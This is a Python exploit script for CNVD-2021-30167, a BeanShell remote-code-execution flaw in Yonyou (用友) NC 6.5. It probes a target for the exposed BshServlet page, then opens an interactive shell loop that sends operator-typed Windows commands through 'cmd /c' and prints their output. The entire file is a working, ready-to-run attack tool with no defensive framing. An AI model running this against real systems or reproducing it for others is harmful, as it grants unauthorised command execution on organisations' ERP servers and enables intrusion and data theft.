import requests
import re
import sys
from urllib.parse import quote

RED = '\x1b[1;91m'
BLUE = '\033[1;94m'
GREEN = '\033[1;32m'
BOLD = '\033[1m'
ENDC = '\033[0m'


def Title():
    print(BOLD + '''
    Title: CNVD-2021-30167 用友NC BeanShell RCE
    Version: NC6.5
    Author: zjun
    HomePage: https://www.zjun.info
    ''' + ENDC)


def NcCheck(target_url):
    print(BLUE + '\n[*]正在检测漏洞是否存在\n' + ENDC)
    url = target_url + '/servlet/~ic/bsh.servlet.BshServlet'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.360'
    }
    try:
        response = requests.get(url=url, headers=headers, timeout=5)
        if response.status_code == 200 and 'BeanShell' in response.text:
            print(GREEN + '[+]BeanShell页面存在, 可能存在漏洞: {}\n'.format(url) + ENDC)
            return url
        else:
            print(RED + '[-]漏洞不存在\n' + ENDC)
            sys.exit(0)
    except:
        print(RED + '[-]无法与目标建立连接\n' + ENDC)
        sys.exit(0)


def NcRce(url):
    print(BLUE + "[*]在command后输入执行命令, 仅适用于Windoes, Linux请手动测试\n" + ENDC)
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.360',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    while True:
        command = str(input(BOLD + 'command: ' + ENDC))
        data = 'bsh.script=' + quote('''exec("cmd /c {}")'''.format(command.replace('\\', '\\\\')), 'utf-8')
        try:
            response = requests.post(url=url, headers=headers, data=data)
            pattern = re.compile('<pre>(.*?)</pre>', re.S)
            result = re.search(pattern, response.text)
            print(result[0].replace('<pre>', '').replace('</pre>', ''))
        except:
            print(RED + '[-]未知错误\n' + ENDC)
            sys.exit(0)


if __name__ == '__main__':
    Title()
    target_url = str(input(BOLD + 'Url: ' + ENDC))
    url = NcCheck(target_url)
    NcRce(url)
